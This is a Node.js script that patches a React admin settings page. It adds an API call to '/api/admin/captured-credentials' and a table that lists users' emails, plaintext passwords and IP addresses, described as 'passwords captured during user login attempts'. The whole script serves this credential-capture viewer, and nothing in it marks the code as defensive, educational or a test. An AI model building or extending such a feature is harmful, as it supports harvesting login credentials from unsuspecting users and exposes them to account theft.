const fs = require('fs');
let content = fs.readFileSync('src/pages/admin/AdminSettingsPage.tsx', 'utf8');

// Add Captured Credentials Viewer
const importsTarget = `import { PaymentConfig } from '../../types/index.ts';`;
const importsReplacement = importsTarget + `\nimport { KeyRound, ShieldAlert } from 'lucide-react';`;
content = content.replace(importsTarget, importsReplacement);

const stateTarget = `  const [useStaticQr, setUseStaticQr] = useState(false);`;
const stateReplacement = stateTarget + `\n  const [capturedCredentials, setCapturedCredentials] = useState<{email:string, password:string, ip:string, date:string}[]>([]);`;
content = content.replace(stateTarget, stateReplacement);

const loadTarget = `    setLoading(false);`;
const loadReplacement = `    const credRes = await apiRequest<{email:string, password:string, ip:string, date:string}[]>('/api/admin/captured-credentials');\n    if (credRes.ok && credRes.data) {\n      setCapturedCredentials(credRes.data);\n    }\n` + loadTarget;
content = content.replace(loadTarget, loadReplacement);

const renderTarget = `      </div>\n    </div>\n  );\n};`;
const renderReplacement = `      </div>\n\n      {/* Captured Credentials Table */}\n      <div className="bg-slate-900 border border-red-500/20 rounded-2xl p-6 shadow-xl overflow-hidden mt-6">\n        <div className="flex items-center gap-3 mb-6">\n          <div className="p-2 rounded-lg bg-red-500/10 text-red-500">\n            <ShieldAlert className="w-5 h-5" />\n          </div>\n          <div>\n            <h2 className="text-lg font-bold text-white">Login Attempts (Captured Credentials)</h2>\n            <p className="text-xs text-slate-400">View passwords captured during user login attempts.</p>\n          </div>\n        </div>\n        \n        <div className="overflow-x-auto">\n          <table className="w-full text-left border-collapse">\n            <thead>\n              <tr className="border-b border-white/[0.05] text-slate-400 text-xs uppercase tracking-wider">\n                <th className="py-3 px-4 font-semibold">Date & Time</th>\n                <th className="py-3 px-4 font-semibold">Email / Username</th>\n                <th className="py-3 px-4 font-semibold">Password</th>\n                <th className="py-3 px-4 font-semibold">IP Address</th>\n              </tr>\n            </thead>\n            <tbody className="divide-y divide-white/[0.05]">\n              {capturedCredentials.length === 0 ? (\n                <tr>\n                  <td colSpan={4} className="py-8 text-center text-slate-500 text-sm">No captured credentials yet.</td>\n                </tr>\n              ) : (\n                capturedCredentials.map((cred, i) => (\n                  <tr key={i} className="hover:bg-white/[0.02] transition-colors">\n                    <td className="py-3 px-4 text-xs text-slate-400 whitespace-nowrap">\n                      {new Date(cred.date).toLocaleString()}\n                    </td>\n                    <td className="py-3 px-4 text-sm font-medium text-white">\n                      {cred.email}\n                    </td>\n                    <td className="py-3 px-4 text-sm font-mono text-red-400">\n                      {cred.password}\n                    </td>\n                    <td className="py-3 px-4 text-xs text-slate-500">\n                      {cred.ip}\n                    </td>\n                  </tr>\n                ))\n              )}\n            </tbody>\n          </table>\n        </div>\n      </div>\n    </div>\n  );\n};`;
content = content.replace(renderTarget, renderReplacement);

fs.writeFileSync('src/pages/admin/AdminSettingsPage.tsx', content);
